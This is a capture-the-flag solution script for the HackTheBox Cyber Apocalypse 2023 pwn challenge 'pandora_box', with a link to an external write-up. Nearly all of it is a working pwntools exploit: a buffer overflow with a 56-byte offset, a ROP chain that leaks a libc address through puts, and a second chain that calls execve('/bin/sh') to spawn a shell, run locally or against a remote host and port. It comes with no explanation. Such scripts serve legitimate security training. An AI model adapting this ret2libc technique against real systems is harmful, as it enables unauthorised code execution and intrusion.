CTF pwn challenge `pandora_box` from hackthebox CTF : Cyber Apocalypse 2023:
> more solutions and write up here => https://chovid99.github.io/posts/cyber-apocalypse-2023-pwn/#labyrinth

```python
#!/usr/bin/env python3

from pwn import *
from sys import argv

context.clear(arch='amd64')
context.binary = elf = ELF('./pb')
elf.address = 0x400000 # No PIE
libc = elf.libc

RIP_OFFSET = 56

# Run process
if len(argv) == 1:
    r = process('./pb')
elif len(argv) == 3:
    r = remote(argv[1], int(argv[2]))
else:
    print('Usage: ./solve.py <HOST> <PORT>')
    exit(1)


# Leak libc address
rop = ROP(elf, badchars=b'\n')
rop.call('puts', [elf.got['printf']])
rop.raw(elf.sym['box'])  # Jump to box function a second time

r.recvuntil(b'>> ')
r.sendline(b'2')
r.recvuntil(b'Insert location of the library: ')
r.sendline(b'A' * RIP_OFFSET + bytes(rop))  # Send the payload
r.recvuntil(b'We will deliver the mythical box to the Library for analysis, thank you!\n\n')

LIBC_WRITE = u64(r.recvline().strip().ljust(8, b'\x00'))
LIBC_BASE = LIBC_WRITE - libc.symbols['printf']

# Get shell
libc.address = LIBC_BASE
rop = ROP([elf, libc], badchars=b'\n')
binsh = next(libc.search(b"/bin/sh\x00"))
rop.execve(binsh, 0, 0)

r.recvuntil(b'>> ')
r.sendline(b'2')
r.recvuntil(b'Insert location of the library: ')
r.sendline(b'A' * RIP_OFFSET + bytes(rop))  # Send the payload

# Drop to interactive shell
r.interactive()
```
